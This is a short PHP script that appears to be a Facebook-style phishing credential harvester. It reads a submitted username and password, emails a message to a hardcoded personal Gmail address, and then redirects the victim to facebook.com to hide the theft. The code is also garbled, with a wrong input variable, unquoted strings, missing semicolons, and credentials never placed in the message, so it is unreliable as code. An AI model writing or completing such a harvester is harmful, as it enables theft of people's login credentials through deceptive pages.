<?php
	function mail_sender(){
		$username = $POST['username'];
		$password = $POST['password'];
		
		$reciever = "binamshrestha12@gmail.com";
		
		$subject = like and share
		$message = please open this and like and share
		$message .= please open this and like and share
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
?>
